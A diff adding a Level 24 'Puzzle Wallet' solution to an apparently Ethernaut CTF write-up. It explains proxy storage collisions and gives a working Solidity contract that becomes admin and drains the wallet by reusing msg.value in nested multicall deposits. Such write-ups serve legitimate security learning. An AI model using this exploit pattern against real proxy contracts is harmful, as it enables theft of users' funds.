@@ -1224,6 +1224,153 @@ contract hack {
 }
 ```
 
-I initially tried setting the approval for the dex contrcat to spend our fakeTokens to 2, overlooking the fact that the dex contract is spending a total of 3 tokens on behalf of us. So, later I updated the amount to be 100 to avoid any confusion.
+I initially tried setting the approval for the dex contract to spend our fakeTokens to 2, overlooking the fact that the dex contract is spending a total of 3 tokens on behalf of us. So, later I updated the amount to be 100 to avoid any confusion.
+
+___
+## Level 24 [Puzzle Wallet]
+
+A drawback of the blockchain technology is that everything is permanent. Once a contract is deployed it can't be updated. So, what we do instead is deploy an implementation contract with all the main logic or code and a second contract generally known as a proxy contract that stores the state variables. A user interacts with the proxy contract, while the proxy contract delegatecalls the implementation contract to execute any necessary functionality. If we need to change or upgrade the functionality of the implementation contract, we simply create a new implementaion contract with the updated logic and change the address of the delegatecall to this new contract solving our problem. Isn't this ingenius!
+
+This level introduces us to the same concept explained above which is used in the blockchain space very popularly - Upgradeable Contracts. But a necessity while using delegatecalls and chained delegatecalls, which happens to be the backbone of the concept of upgardeable contracts is to make sure that the storage of both the caller and the callee contracts must be exactly same, meaning that the declaration of variables should be done in the exact same order in both the contracts. Otherwise, storage collision will take place, which can be exploited very easily.
+
+The challenge contract is a proxy wallet which delgatecalls all of it's functionality to the implementation contract - PuzzleWallet. The goal is to become the admin of the wallet contract. The problem here is same as explained above. The order in which the variables are declared for these contracts are not same, so we can exploit the contract using storage collision.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+pragma experimental ABIEncoderV2;
+
+import "../helpers/UpgradeableProxy-08.sol";
+
+contract PuzzleProxy is UpgradeableProxy {
+    address public pendingAdmin;
+    address public admin;
+
+    constructor(address _admin, address _implementation, bytes memory _initData)
+        UpgradeableProxy(_implementation, _initData)
+    {
+        admin = _admin;
+    }
+
+    modifier onlyAdmin() {
+        require(msg.sender == admin, "Caller is not the admin");
+        _;
+    }
+
+    function proposeNewAdmin(address _newAdmin) external {
+        pendingAdmin = _newAdmin;
+    }
+
+    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
+        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
+        admin = pendingAdmin;
+    }
+
+    function upgradeTo(address _newImplementation) external onlyAdmin {
+        _upgradeTo(_newImplementation);
+    }
+}
+
+contract PuzzleWallet {
+    address public owner;
+    uint256 public maxBalance;
+    mapping(address => bool) public whitelisted;
+    mapping(address => uint256) public balances;
+
+    function init(uint256 _maxBalance) public {
+        require(maxBalance == 0, "Already initialized");
+        maxBalance = _maxBalance;
+        owner = msg.sender;
+    }
+
+    modifier onlyWhitelisted() {
+        require(whitelisted[msg.sender], "Not whitelisted");
+        _;
+    }
+
+    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
+        require(address(this).balance == 0, "Contract balance is not 0");
+        maxBalance = _maxBalance;
+    }
+
+    function addToWhitelist(address addr) external {
+        require(msg.sender == owner, "Not the owner");
+        whitelisted[addr] = true;
+    }
+
+    function deposit() external payable onlyWhitelisted {
+        require(address(this).balance <= maxBalance, "Max balance reached");
+        balances[msg.sender] += msg.value;
+    }
+
+    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
+        require(balances[msg.sender] >= value, "Insufficient balance");
+        balances[msg.sender] -= value;
+        (bool success,) = to.call{value: value}(data);
+        require(success, "Execution failed");
+    }
+
+    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
+        bool depositCalled = false;
+        for (uint256 i = 0; i < data.length; i++) {
+            bytes memory _data = data[i];
+            bytes4 selector;
+            assembly {
+                selector := mload(add(_data, 32))
+            }
+            if (selector == this.deposit.selector) {
+                require(!depositCalled, "Deposit can only be called once");
+                // Protect against reusing msg.value
+                depositCalled = true;
+            }
+            (bool success,) = address(this).delegatecall(data[i]);
+            require(success, "Error while delegating call");
+        }
+    }
+}
+```
+Notice that the admin variable resides in the second storage slot of the proxy wallet while the second slot is occupied by maxBalance in the implementation contract. So, if we manage to update this variable, we will actually be updating the admin variable in the proxy contract. This can be done by calling the `setMaxBalance()` function. However, to call this function, our account must be whitelisted and the balance of the wallet must be 0. Now, to get whitelisted, we must be the owner of the puzzleWallet contract. Notice that the corresponding variable in the proxy contract is pending admin. So, if we change the value of this variable, this will reflect in the owner variable in the puzzleWallet. To do this we can simply call the `proposeNewAdmin()` function and pass the hack contract's address. Now we can call the `addToWhitelist()` function and pass the hack contract's address to get it whitelisted. the ether balance of the wallet is 0.001 ETH which I found from the sepolia etherscan. To drain the ether, we need to send some ether to the contract so that we have some balance and then withdraw all the ether after that. But we can never have more balance than what we deposited, making it impossible for us to withdraw the entire balance of the wallet. This can be achieved by making nested calls to the `multicall()` function. The catch is that when we are iterating based on a call, the `msg.value` of the call remains same throughout the entire loop. But here a restriction has been imposed inside the loop due to which we can't call the `deposit()` function twice. But, this can be bypassed by making a call to the `deposit()` function in the first iteration and the `multicall()` in the second iteration, calling the `deposit()` function again in the second multicall. This will help us bypass the check on the depositCalled variable. During this whole process the `msg.value` remains same. So even though we sent only 0.001 ETH, our balance will be reflected as 0.002 ETH, which happens to be the entire wallet's balance. So, now we can simply make a withdrawl to drain the wallet. Now we pass all the conditions required to call the `setMaxBalance()` function, doing which will change the admin address to our account. Find the hack contract below -
+
+```solidity
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IWallet {
+    function admin() external view returns (address);
+    function proposeNewAdmin(address _newAdmin) external;
+    function addToWhitelist(address addr) external;
+    function deposit() external payable;
+    function multicall(bytes[] calldata data) external payable;
+    function execute(address to, uint256 value, bytes calldata data) external payable;
+    function setMaxBalance(uint256 _maxBalance) external;
+}
+
+contract hack {
+    constructor(IWallet wallet) payable {
+        wallet.proposeNewAdmin(address(this));
+        wallet.addToWhitelist(address(this));
+
+        bytes[] memory deposit_data = new bytes[](1);
+        deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);
+
+        bytes[] memory data = new bytes[](2);
+        data[0] = deposit_data[0];
+        data[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit_data);
+        wallet.multicall{value: 0.001 ether}(data);
+
+        wallet.execute(msg.sender, 0.002 ether, "");
+
+        wallet.setMaxBalance(uint256(uint160(msg.sender)));
+
+        require(wallet.admin()==msg.sender, "hack failed");
+
+        selfdestruct(payable(msg.sender));
+    }
+}
+```
+
+Note that we need to send some ether to the hack contract while deploying it which will eventually be sent to the wallet contract to increase our balance. I also took the liberty of calling the `selfdestruct()` function after the exploit is completed to retrieve all the ether residing in our hack contract.
+
+___
 
 # More solutions coming soon!
